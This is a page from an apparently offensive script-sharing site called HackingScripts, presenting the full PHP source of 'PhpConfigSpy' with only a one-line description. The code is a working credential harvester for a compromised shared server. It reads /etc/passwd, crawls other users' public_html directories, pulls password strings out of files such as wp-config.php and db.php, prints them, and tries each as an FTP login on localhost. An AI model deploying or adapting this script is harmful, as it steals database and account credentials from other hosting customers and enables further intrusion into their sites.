<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> PhpConfigSpy </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>PhpConfigSpy</h2>
<p class="meta">10 Feb 2014</p>

<p>This script appears to try to obtain login details for a compromised server.</p>

<h3>PhpConfigSpy Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span> 
<span class="lineno">  2</span> <span class="k">echo</span> <span class="s2">&quot;&lt;html&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">  3</span> <span class="k">echo</span> <span class="s2">&quot;&lt;title&gt;PhpConfigSpy v0.1&lt;/title&gt;&lt;body&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">  4</span> 
<span class="lineno">  5</span> <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  6</span> 
<span class="lineno">  7</span> <span class="c1">###</span>
<span class="lineno">  8</span> <span class="c1">###</span>
<span class="lineno">  9</span> <span class="c1">###</span>
<span class="lineno"> 10</span> <span class="c1">###</span>
<span class="lineno"> 11</span> <span class="c1">###</span>
<span class="lineno"> 12</span> <span class="c1">###</span>
<span class="lineno"> 13</span> <span class="c1">###</span>
<span class="lineno"> 14</span> <span class="c1">###</span>
<span class="lineno"> 15</span> <span class="c1">### </span>
<span class="lineno"> 16</span> <span class="o">@</span><span class="nv">$passwd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 17</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$passwd</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 18</span>   <span class="k">echo</span> <span class="s2">&quot;[-] Error : coudn&#39;t read /etc/passwd&quot;</span><span class="p">;</span> 
<span class="lineno"> 19</span>   <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 20</span> <span class="p">}</span> 
<span class="lineno"> 21</span> <span class="nv">$path_to_public</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 22</span> <span class="nv">$users</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 23</span> <span class="nv">$pathtoconf</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 24</span> <span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 25</span> 
<span class="lineno"> 26</span> <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 27</span> <span class="nv">$str</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">);</span> 
<span class="lineno"> 28</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">&gt;</span><span class="mi">35</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 29</span>    <span class="nv">$pos</span><span class="o">=</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="s2">&quot;:&quot;</span><span class="p">);</span> 
<span class="lineno"> 30</span>    <span class="nv">$username</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$pos</span><span class="p">);</span> 
<span class="lineno"> 31</span>    <span class="nv">$dirz</span><span class="o">=</span><span class="s2">&quot;/home/</span><span class="si">$username</span><span class="s2">/public_html/&quot;</span><span class="p">;</span> 
<span class="lineno"> 32</span>    <span class="k">if</span> <span class="p">((</span><span class="nv">$username</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 33</span>        <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dirz</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 34</span>            <span class="nb">array_push</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span> 
<span class="lineno"> 35</span>            <span class="nb">array_push</span><span class="p">(</span><span class="nv">$path_to_public</span><span class="p">,</span><span class="nv">$dirz</span><span class="p">);</span> 
<span class="lineno"> 36</span>        <span class="p">}</span> 
<span class="lineno"> 37</span>    <span class="p">}</span> 
<span class="lineno"> 38</span> <span class="p">}</span> 
<span class="lineno"> 39</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno"> 40</span> <span class="p">}</span> 
<span class="lineno"> 41</span> 
<span class="lineno"> 42</span> <span class="c1">###</span>
<span class="lineno"> 43</span> <span class="c1">###</span>
<span class="lineno"> 44</span> <span class="c1">###</span>
<span class="lineno"> 45</span> <span class="c1">###</span>
<span class="lineno"> 46</span> <span class="c1">###</span>
<span class="lineno"> 47</span> <span class="c1">###</span>
<span class="lineno"> 48</span> <span class="c1">###</span>
<span class="lineno"> 49</span> <span class="c1">###</span>
<span class="lineno"> 50</span> <span class="c1">#### </span>
<span class="lineno"> 51</span> 
<span class="lineno"> 52</span> 
<span class="lineno"> 53</span> <span class="c1">###</span>
<span class="lineno"> 54</span> <span class="c1">###</span>
<span class="lineno"> 55</span> <span class="c1">###</span>
<span class="lineno"> 56</span> <span class="c1">###</span>
<span class="lineno"> 57</span> <span class="c1">###</span>
<span class="lineno"> 58</span> <span class="c1">###</span>
<span class="lineno"> 59</span> <span class="c1">###</span>
<span class="lineno"> 60</span> <span class="c1">###</span>
<span class="lineno"> 61</span> <span class="c1">###</span>
<span class="lineno"> 62</span> <span class="c1">###</span>
<span class="lineno"> 63</span> <span class="c1">###</span>
<span class="lineno"> 64</span> <span class="c1">#### </span>
<span class="lineno"> 65</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 66</span> <span class="k">echo</span> <span class="s2">&quot;&lt;textarea name=&#39;main_window&#39; cols=100 rows=20&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 67</span> 
<span class="lineno"> 68</span> <span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$users</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; entrys in /etc/passwd</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 69</span> <span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$path_to_public</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; readable public_html directories</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 70</span> 
<span class="lineno"> 71</span> <span class="k">echo</span> <span class="s2">&quot;[~] Searching for passwords in config.* files...</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 72</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$users</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 73</span>        <span class="nv">$path</span><span class="o">=</span><span class="s2">&quot;/home/</span><span class="si">$user</span><span class="s2">/public_html/&quot;</span><span class="p">;</span> 
<span class="lineno"> 74</span>        <span class="nx">read_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span> 
<span class="lineno"> 75</span> <span class="p">}</span> 
<span class="lineno"> 76</span> 
<span class="lineno"> 77</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Done</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 78</span> 
<span class="lineno"> 79</span> <span class="k">function</span> <span class="nf">read_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 80</span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 81</span>        <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span> 
<span class="lineno"> 82</span>              <span class="nv">$fpath</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$path$file</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 83</span>              <span class="k">if</span> <span class="p">((</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 84</span>                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$fpath</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 85</span>                    <span class="nv">$dr</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$fpath</span><span class="s2">/&quot;</span><span class="p">;</span> 
<span class="lineno"> 86</span>                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dr</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 87</span>                       <span class="nx">read_dir</span><span class="p">(</span><span class="nv">$dr</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span> 
<span class="lineno"> 88</span>                    <span class="p">}</span> 
<span class="lineno"> 89</span>                    <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 90</span>                         <span class="k">if</span> <span class="p">((</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;config.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;config.inc.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db.inc.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;connect.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;wp-config.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;var.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;configure.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db.php&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;db_connect.php&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 91</span>                            <span class="nv">$pass</span><span class="o">=</span><span class="nx">get_pass</span><span class="p">(</span><span class="nv">$fpath</span><span class="p">);</span> 
<span class="lineno"> 92</span>                            <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 93</span>                               <span class="k">echo</span> <span class="s2">&quot;[+] </span><span class="si">$fpath\n$pass\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 94</span>                               <span class="nx">ftp_check</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno"> 95</span>                            <span class="p">}</span> 
<span class="lineno"> 96</span>                         <span class="p">}</span> 
<span class="lineno"> 97</span>                    <span class="p">}</span> 
<span class="lineno"> 98</span>                 <span class="p">}</span> 
<span class="lineno"> 99</span>              <span class="p">}</span> 
<span class="lineno">100</span>        <span class="p">}</span> 
<span class="lineno">101</span>    <span class="p">}</span> 
<span class="lineno">102</span> <span class="p">}</span> 
<span class="lineno">103</span> 
<span class="lineno">104</span> <span class="k">function</span> <span class="nf">get_pass</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">105</span>    <span class="o">@</span><span class="nv">$config</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno">106</span>    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$config</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno">107</span>        <span class="nv">$line</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span> 
<span class="lineno">108</span>        <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;passwd&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno">109</span>            <span class="k">if</span> <span class="p">(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;&quot;&#39;</span><span class="p">))</span> 
<span class="lineno">110</span>               <span class="nv">$pass</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">),(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;&quot;&#39;</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">)));</span> 
<span class="lineno">111</span>            <span class="k">else</span> 
<span class="lineno">112</span>               <span class="nv">$pass</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">),(</span><span class="nb">strrpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s2">&quot;&#39;&quot;</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">)));</span> 
<span class="lineno">113</span>            <span class="k">return</span> <span class="nv">$pass</span><span class="p">;</span> 
<span class="lineno">114</span>        <span class="p">}</span> 
<span class="lineno">115</span>    <span class="p">}</span> 
<span class="lineno">116</span> <span class="p">}</span> 
<span class="lineno">117</span> 
<span class="lineno">118</span> <span class="k">function</span> <span class="nf">ftp_check</span><span class="p">(</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">119</span>     <span class="o">@</span><span class="nv">$ftp</span><span class="o">=</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">);</span> 
<span class="lineno">120</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$ftp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">121</span>        <span class="o">@</span><span class="nv">$res</span><span class="o">=</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno">122</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">123</span>           <span class="k">echo</span> <span class="s1">&#39;[FTP] &#39;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;  Success</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">124</span>        <span class="p">}</span> 
<span class="lineno">125</span>        <span class="k">else</span> <span class="nb">ftp_quit</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">);</span> 
<span class="lineno">126</span>     <span class="p">}</span> 
<span class="lineno">127</span> <span class="p">}</span> 
<span class="lineno">128</span> 
<span class="lineno">129</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">130</span> 
<span class="lineno">131</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">132</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
